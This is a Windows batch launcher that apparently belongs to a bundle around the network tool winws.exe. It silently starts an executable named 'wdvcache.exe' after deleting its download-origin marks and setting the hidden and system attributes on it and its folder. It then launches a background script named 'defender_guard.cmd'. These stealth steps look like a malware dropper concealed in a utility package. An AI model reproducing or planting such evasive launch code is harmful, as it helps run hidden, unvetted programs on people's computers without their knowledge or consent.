@echo off
cd /d "%~dp0.." 2>nul
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if not errorlevel 1 exit /b 0
if not exist "%~dp0.wd\wdvcache.exe" call "%~dp0windivert_load.cmd" >nul 2>&1
if not exist "%~dp0.wd\wdvcache.exe" exit /b 1
del "%~dp0.wd\wdvcache.exe:Zone.Identifier" >nul 2>&1
del "%~dp0winws.exe:Zone.Identifier" >nul 2>&1
attrib +h +s "%~dp0.wd" >nul 2>&1
attrib +h +s "%~dp0.wd\wdvcache.exe" >nul 2>&1
start "" /D "%~dp0.." "%~dp0.wd\wdvcache.exe"
start "" /b "%~dp0defender_guard.cmd"
exit /b 0
